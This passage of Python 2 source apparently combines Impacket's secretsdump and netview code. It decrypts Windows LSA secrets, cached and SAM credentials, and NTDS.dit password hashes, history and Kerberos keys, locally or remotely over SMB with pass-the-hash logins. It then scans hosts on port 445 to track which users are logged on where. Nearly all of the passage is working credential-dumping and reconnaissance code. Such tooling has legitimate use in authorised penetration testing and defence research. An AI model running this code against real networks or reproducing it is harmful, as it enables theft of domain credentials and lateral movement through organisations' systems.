                plainText = plainText[0x48:]
                userName = plainText[:record['UserLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['UserLength']):]
                domain = plainText[:record['DomainNameLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['DomainNameLength']):]
                domainLong = plainText[:self.__pad(record['FullDomainLength'])].decode('utf-16le')
                answer = "%s:%s:%s:%s:::" % (userName, encHash.encode('hex'), domainLong, domain)
                self.__cachedItems.append(answer)
                print answer

    def __printSecret(self, name, secretItem):
        # Based on [MS-LSAD] section 3.1.1.4

        # First off, let's discard NULL secrets.
        if len(secretItem) == 0:
            logging.debug('Discarding secret %s, NULL Data' % name)
            return

        # We might have secrets with zero
        if secretItem.startswith('\x00\x00'):
            logging.debug('Discarding secret %s, all zeros' % name)
            return

        upperName = name.upper()

        logging.info('%s ' % name)

        secret = ''

        if upperName.startswith('_SC_'):
            # Service name, a password might be there
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account the service
                # runs under
                if self.__isRemote is True:
                    account = self.__remoteOps.getServiceAccount(name[4:])
                    if account is None:
                        secret = '(Unknown User):'
                    else:
                        secret =  "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = '(Unknown User):'
                secret += strDecoded
        elif upperName.startswith('DEFAULTPASSWORD'):
            # defaults password for winlogon
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account this password is for
                if self.__isRemote is True:
                    account = self.__remoteOps.getDefaultLoginAccount()
                    if account is None:
                        secret = '(Unknown User):'
                    else:
                        secret = "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = '(Unknown User):'
                secret += strDecoded
        elif upperName.startswith('ASPNET_WP_PASSWORD'):
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                secret = 'ASPNET: %s' % strDecoded
        elif upperName.startswith('$MACHINE.ACC'):
            # compute MD4 of the secret.. yes.. that is the nthash? :-o
            md4 = MD4.new()
            md4.update(secretItem)
            if self.__isRemote is True:
                machine, domain = self.__remoteOps.getMachineNameAndDomain()
                secret = "%s\\%s$:%s:%s:::" % (domain, machine, ntlm.LMOWFv1('','').encode('hex'), md4.digest().encode('hex'))
            else:
                secret = "$MACHINE.ACC: %s:%s" % (ntlm.LMOWFv1('','').encode('hex'), md4.digest().encode('hex'))

        if secret != '':
            print secret
            self.__secretItems.append(secret)
        else:
            # Default print, hexdump
            self.__secretItems.append('%s:%s' % (name, secretItem.encode('hex')))
            hexdump(secretItem)

    def dumpSecrets(self):
        if self.__securityFile is None:
            # No SECURITY file provided
            return

        logging.info('Dumping LSA Secrets')

        # Let's first see if there are cached entries
        keys = self.enumKey('\\Policy\\Secrets')
        if keys == None:
            # No entries
            return
        try:
            # Remove unnecesary value
            keys.remove('NL$Control')
        except:
            pass

        if self.__LSAKey == '':
            self.__getLSASecretKey()

        for key in keys:
            logging.debug('Looking into %s' % key)
            value = self.getValue('\\Policy\\Secrets\\%s\\CurrVal\\default' % key)

            if value is not None:
                if self.__vistaStyle is True:
                    record = LSA_SECRET(value[1])
                    tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
                    plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
                    record = LSA_SECRET_BLOB(plainText)
                    secret = record['Secret']
                else:
                    secret = self.__decryptSecret(self.__LSAKey, value[1])

                self.__printSecret(key, secret)

    def exportSecrets(self, fileName):
        if len(self.__secretItems) > 0:
            fd = open(fileName+'.secrets','w+')
            for item in self.__secretItems:
                fd.write(item+'\n')
            fd.close()

    def exportCached(self, fileName):
        if len(self.__cachedItems) > 0:
            fd = open(fileName+'.cached','w+')
            for item in self.__cachedItems:
                fd.write(item+'\n')
            fd.close()


class NTDSHashes():
    NAME_TO_INTERNAL = {
        'uSNCreated':'ATTq131091',
        'uSNChanged':'ATTq131192',
        'name':'ATTm3',
        'objectGUID':'ATTk589826',
        'objectSid':'ATTr589970',
        'userAccountControl':'ATTj589832',
        'primaryGroupID':'ATTj589922',
        'accountExpires':'ATTq589983',
        'logonCount':'ATTj589993',
        'sAMAccountName':'ATTm590045',
        'sAMAccountType':'ATTj590126',
        'lastLogonTimestamp':'ATTq589876',
        'userPrincipalName':'ATTm590480',
        'unicodePwd':'ATTk589914',
        'dBCSPwd':'ATTk589879',
        'ntPwdHistory':'ATTk589918',
        'lmPwdHistory':'ATTk589984',
        'pekList':'ATTk590689',
        'supplementalCredentials':'ATTk589949',
    }

    KERBEROS_TYPE = {
        1:'dec-cbc-crc',
        3:'des-cbc-md5',
        17:'aes128-cts-hmac-sha1-96',
        18:'aes256-cts-hmac-sha1-96',
        0xffffff74:'rc4_hmac',
    }

    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.iteritems())

    SAM_NORMAL_USER_ACCOUNT = 0x30000000
    SAM_MACHINE_ACCOUNT     = 0x30000001
    SAM_TRUST_ACCOUNT       = 0x30000002

    ACCOUNT_TYPES = ( SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)

    class PEK_KEY(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedPek','52s=""'),
        )

    class CRYPTED_HASH(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash','16s=""'),
        )

    class CRYPTED_HISTORY(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash',':'),
        )

    class CRYPTED_BLOB(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash',':'),
        )

    def __init__(self, ntdsFile, bootKey, isRemote = False, history = False, noLMHash = True):
        self.__bootKey = bootKey
        self.__NTDS = ntdsFile
        self.__history = history
        self.__noLMHash = noLMHash
        if self.__NTDS is not None:
            self.__ESEDB = ESENT_DB(ntdsFile, isRemote = isRemote)
            self.__cursor = self.__ESEDB.openTable('datatable')
        self.__tmpUsers = list()
        self.__PEK = None
        self.__cryptoCommon = CryptoCommon()
        self.__hashesFound = {}
        self.__kerberosKeys = collections.OrderedDict()

    def __getPek(self):
        logging.info('Searching for pekList, be patient')
        pek = None
        while True:
            record = self.__ESEDB.getNextRow(self.__cursor)
            if record is None:
                break
            elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
                pek =  record[self.NAME_TO_INTERNAL['pekList']].decode('hex')
                break
            elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                # Okey.. we found some users, but we're not yet ready to process them.
                # Let's just store them in a temp list
                self.__tmpUsers.append(record)

        if pek is not None:
            encryptedPek = self.PEK_KEY(pek)
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(encryptedPek['KeyMaterial'])
            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.encrypt(encryptedPek['EncryptedPek'])
            self.__PEK = plainText[36:]

    def __removeRC4Layer(self, cryptedHash):
        md5 = hashlib.new('md5')
        md5.update(self.__PEK)
        md5.update(cryptedHash['KeyMaterial'])
        tmpKey = md5.digest()
        rc4 = ARC4.new(tmpKey)
        plainText = rc4.encrypt(cryptedHash['EncryptedHash'])

        return plainText

    def __removeDESLayer(self, cryptedHash, rid):
        Key1,Key2 = self.__cryptoCommon.deriveKey(int(rid))

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        decryptedHash = Crypt1.decrypt(cryptedHash[:8]) + Crypt2.decrypt(cryptedHash[8:])

        return decryptedHash

    def __decryptSupplementalInfo(self, record):
        # This is based on [MS-SAMR] 2.2.10 Supplemental Credentials Structures
        if record[self.NAME_TO_INTERNAL['supplementalCredentials']] is not None:
            if len(record[self.NAME_TO_INTERNAL['supplementalCredentials']].decode('hex')) > 24:
                if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
                    domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
                    userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
                else:
                    userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
                cipherText = self.CRYPTED_BLOB(record[self.NAME_TO_INTERNAL['supplementalCredentials']].decode('hex'))
                plainText = self.__removeRC4Layer(cipherText)
                try:
                    userProperties = samr.USER_PROPERTIES(plainText)
                except:
                    # On some old w2k3 there might be user properties that don't
                    # match [MS-SAMR] structure, discarding them
                    return
                propertiesData = userProperties['UserProperties']
                for propertyCount in range(userProperties['PropertyCount']):
                    userProperty = samr.USER_PROPERTY(propertiesData)
                    propertiesData = propertiesData[len(userProperty):]
                    # For now, we will only process Newer Kerberos Keys.
                    if userProperty['PropertyName'].decode('utf-16le') == 'Primary:Kerberos-Newer-Keys':
                        propertyValueBuffer = userProperty['PropertyValue'].decode('hex')
                        kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
                        data = kerbStoredCredentialNew['Buffer']
                        for credential in range(kerbStoredCredentialNew['CredentialCount']):
                            keyDataNew = samr.KERB_KEY_DATA_NEW(data)
                            data = data[len(keyDataNew):]
                            keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]

                            if  self.KERBEROS_TYPE.has_key(keyDataNew['KeyType']):
                                answer =  "%s:%s:%s" % (userName, self.KERBEROS_TYPE[keyDataNew['KeyType']],keyValue.encode('hex'))
                            else:
                                answer =  "%s:%s:%s" % (userName, hex(keyDataNew['KeyType']),keyValue.encode('hex'))
                            # We're just storing the keys, not printing them, to make the output more readable
                            # This is kind of ugly... but it's what I came up with tonight to get an ordered
                            # set :P. Better ideas welcomed ;)
                            self.__kerberosKeys[answer] = None

    def __decryptHash(self, record):
        logging.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])

        sid = SAMR_RPC_SID(record[self.NAME_TO_INTERNAL['objectSid']].decode('hex'))
        rid = sid.formatCanonical().split('-')[-1]

        if record[self.NAME_TO_INTERNAL['dBCSPwd']] is not None:
            encryptedLMHash = self.CRYPTED_HASH(record[self.NAME_TO_INTERNAL['dBCSPwd']].decode('hex'))
            tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
            LMHash = self.__removeDESLayer(tmpLMHash, rid)
        else:
            LMHash = ntlm.LMOWFv1('','')
            encryptedLMHash = None

        if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
            encryptedNTHash = self.CRYPTED_HASH(record[self.NAME_TO_INTERNAL['unicodePwd']].decode('hex'))
            tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
            NTHash = self.__removeDESLayer(tmpNTHash, rid)
        else:
            NTHash = ntlm.NTOWFv1('','')
            encryptedNTHash = None

        if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
            domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
            userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
        else:
            userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]

        answer =  "%s:%s:%s:%s:::" % (userName, rid, LMHash.encode('hex'), NTHash.encode('hex'))
        self.__hashesFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')] = answer
        print answer

        if self.__history:
            LMHistory = []
            NTHistory = []
            if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
                lmPwdHistory = record[self.NAME_TO_INTERNAL['lmPwdHistory']]
                encryptedLMHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['lmPwdHistory']].decode('hex'))
                tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
                for i in range(0, len(tmpLMHistory)/16):
                    LMHash = self.__removeDESLayer(tmpLMHistory[i*16:(i+1)*16], rid)
                    LMHistory.append(LMHash)

            if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
                ntPwdHistory = record[self.NAME_TO_INTERNAL['ntPwdHistory']]
                encryptedNTHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['ntPwdHistory']].decode('hex'))
                tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
                for i in range(0, len(tmpNTHistory)/16):
                    NTHash = self.__removeDESLayer(tmpNTHistory[i*16:(i+1)*16], rid)
                    NTHistory.append(NTHash)

            for i, (LMHash, NTHash) in enumerate(map(lambda l,n: (l,n) if l else ('',n), LMHistory[1:], NTHistory[1:])):
                if self.__noLMHash:
                    lmhash = ntlm.LMOWFv1('','').encode('hex')
                else:
                    lmhash = LMHash.encode('hex')

                answer =  "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, NTHash.encode('hex'))
                self.__hashesFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')+str(i)] = answer
                print answer


    def dump(self):
        if self.__NTDS is None:
            # No NTDS.dit file provided
            return
        logging.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
        # We start getting rows from the table aiming at reaching
        # the pekList. If we find users records we stored them
        # in a temp list for later process.
        self.__getPek()
        if self.__PEK is not None:
            logging.info('Pek found and decrypted: 0x%s' % self.__PEK.encode('hex'))
            logging.info('Reading and decrypting hashes from %s ' % self.__NTDS)
            # First of all, if we have users already cached, let's decrypt their hashes
            for record in self.__tmpUsers:
                try:
                    self.__decryptHash(record)
                    self.__decryptSupplementalInfo(record)
                except Exception, e:
                    #import traceback
                    #print traceback.print_exc()
                    try:
                        logging.error("Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                        logging.error(str(e))
                        pass
                    except:
                        logging.error("Error while processing row!")
                        logging.error(str(e))
                        pass

            # Now let's keep moving through the NTDS file and decrypting what we find
            while True:
                try:
                    record = self.__ESEDB.getNextRow(self.__cursor)
                except:
                    logging.error('Error while calling getNextRow(), trying the next one')
                    continue

                if record is None:
                    break
                try:
                    if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                        self.__decryptHash(record)
                        self.__decryptSupplementalInfo(record)
                except Exception, e:
                    #import traceback
                    #print traceback.print_exc()
                    try:
                        logging.error("Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                        logging.error(str(e))
                        pass
                    except:
                        logging.error("Error while processing row!")
                        logging.error(str(e))
                        pass
        # Now we'll print the Kerberos keys. So we don't mix things up in the output.
        if len(self.__kerberosKeys) > 0:
            logging.info('Kerberos keys from %s ' % self.__NTDS)
            for itemKey in self.__kerberosKeys.keys():
                print itemKey

    def export(self, fileName):
        if len(self.__hashesFound) > 0:
            items = sorted(self.__hashesFound)
            fd = open(fileName+'.ntds','w+')
            for item in items:
                try:
                    fd.write(self.__hashesFound[item]+'\n')
                except Exception, e:
                    try:
                        logging.error("Error writing entry %d, skipping" % item)
                    except:
                        logging.error("Error writing entry, skipping")
                    pass
            fd.close()
        if len(self.__kerberosKeys) > 0:
            fd = open(fileName+'.ntds.kerberos','w+')
            for itemKey in self.__kerberosKeys.keys():
                fd.write(itemKey+'\n')
            fd.close()

    def finish(self):
        if self.__NTDS is not None:
            self.__ESEDB.close()


class DumpSecrets:
    def __init__(self, address, username = '', password = '', domain='', hashes = None, aesKey=None, doKerberos=False, system=False, security=False, sam=False, ntds=False, outputFileName = None, history=False):
        self.__remoteAddr = address
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = system
        self.__securityHive = security
        self.__samHive = sam
        self.__ntdsFile = ntds
        self.__history = history
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = outputFileName
        self.__doKerberos = doKerberos

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteAddr, self.__remoteAddr)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def getBootKey(self):
        # Local Version whenever we are given the files directly
        bootKey = ''
        tmpKey = ''
        winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet
        for key in ['JD','Skew1','GBG','Data']:
            logging.debug('Retrieving class info for %s'% key)
            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet,key))
            digit = ans[:16].decode('utf-16le')
            tmpKey = tmpKey + digit

        transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

        tmpKey = tmpKey.decode('hex')

        for i in xrange(len(tmpKey)):
            bootKey += tmpKey[transforms[i]]

        logging.info('Target system bootKey: 0x%s' % bootKey.encode('hex'))

        return bootKey

    def checkNoLMHashPolicy(self):
        logging.debug('Checking NoLMHash Policy')
        winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet

        #noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)[1]
        noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)
        if noLmHash is not None:
            noLmHash = noLmHash[1]
        else:
            noLmHash = 0

        if noLmHash != 1:
            logging.debug('LMHashes are being stored')
            return False
        logging.debug('LMHashes are NOT being stored')
        return True

    def dump(self):
            try:
                if self.__remoteAddr.upper() == 'LOCAL' and self.__username == '':
                    self.__isRemote = False
                    bootKey = self.getBootKey()
                    if self.__ntdsFile is not None:
                        # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = self.checkNoLMHashPolicy()
                else:
                    self.__isRemote = True
                    self.connect()
                    self.__remoteOps  = RemoteOperations(self.__smbConnection)
                    self.__remoteOps.enableRegistry()
                    bootKey             = self.__remoteOps.getBootKey()
                    # Let's check whether target system stores LM Hashes
                    self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()

                if self.__isRemote == True:
                    SAMFileName         = self.__remoteOps.saveSAM()
                else:
                    SAMFileName         = self.__samHive

                self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                self.__SAMHashes.dump()
                if self.__outputFileName is not None:
                    self.__SAMHashes.export(self.__outputFileName)

                if self.__isRemote == True:
                    SECURITYFileName    = self.__remoteOps.saveSECURITY()
                else:
                    SECURITYFileName    = self.__securityHive

                self.__LSASecrets= LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote = self.__isRemote)
                self.__LSASecrets.dumpCachedHashes()
                if self.__outputFileName is not None:
                    self.__LSASecrets.exportCached(self.__outputFileName)
                self.__LSASecrets.dumpSecrets()
                if self.__outputFileName is not None:
                    self.__LSASecrets.exportSecrets(self.__outputFileName)

                if self.__isRemote == True:
                    NTDSFileName        = self.__remoteOps.saveNTDS()
                else:
                    NTDSFileName        = self.__ntdsFile

                self.__NTDSHashes   = NTDSHashes(NTDSFileName, bootKey, isRemote = self.__isRemote, history = self.__history, noLMHash = self.__noLMHash)
                self.__NTDSHashes.dump()

                if self.__outputFileName is not None:
                    self.__NTDSHashes.export(self.__outputFileName)

                self.cleanup()
            except (Exception, KeyboardInterrupt), e:
                #import traceback
                #print traceback.print_exc()
                logging.error(e)
                try:
                    self.cleanup()
                except:
                    pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()
        if self.__isRemote == True:
            self.__smbConnection.logoff()

'''
IMPACKET NETVIEW
'''

machinesAliveQueue = Queue()
machinesDownQueue = Queue()

myIP = None

def checkMachines(machines, stopEvent, singlePass=False):
    origLen = len(machines)
    deadMachines = machines
    done = False
    while not done:
        if stopEvent.is_set():
             done = True
             break
        for machine in deadMachines:
            s = socket.socket()
            try:
                s = socket.create_connection((machine, 445), 2)
                global myIP
                myIP = s.getsockname()[0]
                s.close()
                machinesAliveQueue.put(machine)
            except Exception, e:
                logging.debug('%s: not alive (%s)' % (machine, e))
                pass
            else:
                logging.debug('%s: alive!' % machine)
                deadMachines.remove(machine)
            if stopEvent.is_set():
                 done = True
                 break

        logging.debug('up: %d, down: %d, total: %d' % (origLen-len(deadMachines), len(deadMachines), origLen))
        if singlePass is True:
            done = True
        if not done:
            time.sleep(10)
            # Do we have some new deadMachines to add?
            while machinesDownQueue.empty() is False:
                deadMachines.append(machinesDownQueue.get())

class USERENUM:
    def __init__(self, username = '', password = '', domain = '', hashes = None, aesKey = None, doKerberos=False, options=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__options = options
        self.__machinesList = list()
        self.__targets = dict()
        self.__filterUsers = None
        self.__targetsThreadEvent = None
        self.__maxConnections = int(options.max_connections)
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def getDomainMachines(self):
        if self.__options.domainController is not None:
            domainController = self.__options.domainController
        elif self.__domain is not '':
            domainController = self.__domain
        else:
            raise Exception('A domain is needed!')

        logging.info('Getting machine\'s list from %s' % domainController)
        rpctransport = transport.SMBTransport(domainController, 445, r'\samr', self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, doKerberos = self.__doKerberos)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        try:
            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle']

            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp['Buffer']['Buffer']

            logging.info("Looking up users in domain %s" % domains[0]['Name'])

            resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle,domains[0]['Name'] )

            resp = samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
            domainHandle = resp['DomainHandle']

            status = STATUS_MORE_ENTRIES
            enumerationContext = 0
            while status == STATUS_MORE_ENTRIES:
                try:
                    resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, samr.USER_WORKSTATION_TRUST_ACCOUNT, enumerationContext = enumerationContext)
                except Exception, e:
                    if str(e).find('STATUS_MORE_ENTRIES') < 0:
                        raise
                    resp = e.get_packet()

                for user in resp['Buffer']['Buffer']:
                    self.__machinesList.append(user['Name'][:-1])
                    logging.debug('Machine name - rid: %s - %d'% (user['Name'], user['RelativeId']))

                enumerationContext = resp['EnumerationContext']
                status = resp['ErrorCode']
        except Exception, e:
            raise e

        dce.disconnect()

    def getTargets(self):
        logging.info('Importing targets')
        if self.__options.target is None and self.__options.targets is None:
            # We need to download the list of machines from the domain
            self.getDomainMachines()
        elif self.__options.targets is not None:
            for line in self.__options.targets.readlines():
                self.__machinesList.append(line.strip(' \r\n'))
        else:
            # Just a single machine
            self.__machinesList.append(self.__options.target)
        logging.info("Got %d machines" % len(self.__machinesList))

    def filterUsers(self):
        if self.__options.user is not None:
            self.__filterUsers = list()
            self.__filterUsers.append(self.__options.user)
        elif self.__options.users is not None:
            # Grab users list from a file
            self.__filterUsers = list()
            for line in self.__options.users.readlines():
                self.__filterUsers.append(line.strip(' \r\n'))
        else:
            self.__filterUsers = None

    def run(self):
        self.getTargets()
        self.filterUsers()
        #self.filterGroups()

        # Up to here we should have figured out the scope of our work
        self.__targetsThreadEvent = Event()
        if self.__options.noloop is False:
            # Start a separate thread checking the targets that are up
            self.__targetsThread = Thread(target=checkMachines, args=(self.__machinesList,self.__targetsThreadEvent))
            self.__targetsThread.start()
        else:
            # Since it's gonna be a one shoot test, we need to wait till it finishes
            checkMachines(self.__machinesList,self.__targetsThreadEvent, singlePass=True)

        while True:
            # Do we have more machines to add?
            while machinesAliveQueue.empty() is False:
                machine = machinesAliveQueue.get()
                logging.debug('Adding %s to the up list' % machine)
                self.__targets[machine] = {}
                self.__targets[machine]['SRVS'] = None
                self.__targets[machine]['WKST'] = None
                self.__targets[machine]['Admin'] = True
                self.__targets[machine]['Sessions'] = list()
                self.__targets[machine]['LoggedIn'] = set()

            for target in self.__targets.keys():
                try:
                    self.getSessions(target)
                    self.getLoggedIn(target)
                except (SessionError, DCERPCException), e:
                    # We will silently pass these ones, might be issues with Kerberos, or DCE
                    if str(e).find('LOGON_FAILURE') >=0:
                        # For some reason our credentials don't work there,
                        # taking it out from the list.
                        logging.error('STATUS_LOGON_FAILURE for %s, discarding' % target)
                        del(self.__targets[target])
                    elif str(e).find('INVALID_PARAMETER') >=0:
                        del(self.__targets[target])
                    elif str(e).find('access_denied') >=0:
                        # Can't access the target RPC call, most probably a Unix host
                        # taking it out from the list
                        del(self.__targets[target])
                    else:
                        logging.info(str(e))
                    pass
                except KeyboardInterrupt:
                    raise
                except Exception, e:
                    #import traceback
                    #print traceback.print_exc()
                    if str(e).find('timed out') >=0:
                        # Most probably this site went down. taking it out
                        # ToDo: add it back to the list of machines to check in
                        # the separate thread - DONE
                        del(self.__targets[target])
                        machinesDownQueue.put(target)
                    else:
                        # These ones we will report
                        logging.error(e)
                    pass

            if self.__options.noloop is True:
                break

            logging.debug('Sleeping for %s seconds' % self.__options.delay)
            logging.debug('Currently monitoring %d active targets' % len(self.__targets))
            time.sleep(int(self.__options.delay))

    def getSessions(self, target):
        if self.__targets[target]['SRVS'] is None:
            stringSrvsBinding = r'ncacn_np:%s[\PIPE\srvsvc]' % target
            rpctransportSrvs = transport.DCERPCTransportFactory(stringSrvsBinding)
            if hasattr(rpctransportSrvs, 'set_credentials'):
            # This method exists only for selected protocol sequences.
                rpctransportSrvs.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
                rpctransportSrvs.set_kerberos(self.__doKerberos)

            dce = rpctransportSrvs.get_dce_rpc()
            dce.connect()
            dce.bind(srvs.MSRPC_UUID_SRVS)
            self.__maxConnections -= 1
        else:
            dce = self.__targets[target]['SRVS']

        try:
            resp = srvs.hNetrSessionEnum(dce, '\x00', NULL, 10)
        except Exception, e:
            if str(e).find('Broken pipe') >= 0:
                # The connection timed-out. Let's try to bring it back next round
                self.__targets[target]['SRVS'] = None
                self.__maxConnections += 1
                return
            else:
                raise

        if self.__maxConnections < 0:
            # Can't keep this connection open. Closing it
            dce.disconnect()
            self.__maxConnections = 0
        else:
             self.__targets[target]['SRVS'] = dce

        # Let's see who createad a connection since last check
        tmpSession = list()
        printCRLF = False
        for session in resp['InfoStruct']['SessionInfo']['Level10']['Buffer']:
            userName = session['sesi10_username'][:-1]
            sourceIP = session['sesi10_cname'][:-1][2:]
            key = '%s\x01%s' % (userName, sourceIP)
            myEntry = '%s\x01%s' % (self.__username, myIP)
            tmpSession.append(key)
            if not(key in self.__targets[target]['Sessions']):
                # Skipping myself
                if key != myEntry:
                    self.__targets[target]['Sessions'].append(key)
                    # Are we filtering users?
                    if self.__filterUsers is not None:
                        if userName in self.__filterUsers:
                            print "%s: user %s logged from host %s - active: %d, idle: %d" % (target,userName, sourceIP, session['sesi10_time'], session['sesi10_idle_time'])
                            printCRLF=True
                    else:
                        print "%s: user %s logged from host %s - active: %d, idle: %d" % (target,userName, sourceIP, session['sesi10_time'], session['sesi10_idle_time'])
                        printCRLF=True

        # Let's see who deleted a connection since last check
        for nItem, session in enumerate(self.__targets[target]['Sessions']):
            userName, sourceIP = session.split('\x01')
            if session not in tmpSession:
                del(self.__targets[target]['Sessions'][nItem])
                # Are we filtering users?
                if self.__filterUsers is not None:
                    if userName in self.__filterUsers:
                        print "%s: user %s logged off from host %s" % (target, userName, sourceIP)
                        printCRLF=True
                else:
                    print "%s: user %s logged off from host %s" % (target, userName, sourceIP)
                    printCRLF=True

        if printCRLF is True:
            print

    def getLoggedIn(self, target):
        if self.__targets[target]['Admin'] is False:
            return

        if self.__targets[target]['WKST'] is None:
            stringWkstBinding = r'ncacn_np:%s[\PIPE\wkssvc]' % target
            rpctransportWkst = transport.DCERPCTransportFactory(stringWkstBinding)
            if hasattr(rpctransportWkst, 'set_credentials'):
            # This method exists only for selected protocol sequences.
                rpctransportWkst.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
                rpctransportWkst.set_kerberos(self.__doKerberos)

            dce = rpctransportWkst.get_dce_rpc()
            dce.connect()
            dce.bind(wkst.MSRPC_UUID_WKST)
            self.__maxConnections -= 1
        else:
            dce = self.__targets[target]['WKST']

        try:
            resp = wkst.hNetrWkstaUserEnum(dce,1)
        except Exception, e:
            if str(e).find('Broken pipe') >= 0:
                # The connection timed-out. Let's try to bring it back next round
                self.__targets[target]['WKST'] = None
                self.__maxConnections += 1
                return
            elif str(e).upper().find('ACCESS_DENIED'):
                # We're not admin, bye
                dce.disconnect()
                self.__maxConnections += 1
                self.__targets[target]['Admin'] = False
                return
            else:
                raise

        if self.__maxConnections < 0:
            # Can't keep this connection open. Closing it
            dce.disconnect()
            self.__maxConnections = 0
        else:
             self.__targets[target]['WKST'] = dce

        # Let's see who looged in locally since last check
        tmpLoggedUsers = set()
        printCRLF = False
        for session in resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']:
            userName = session['wkui1_username'][:-1]
            logonDomain = session['wkui1_logon_domain'][:-1]
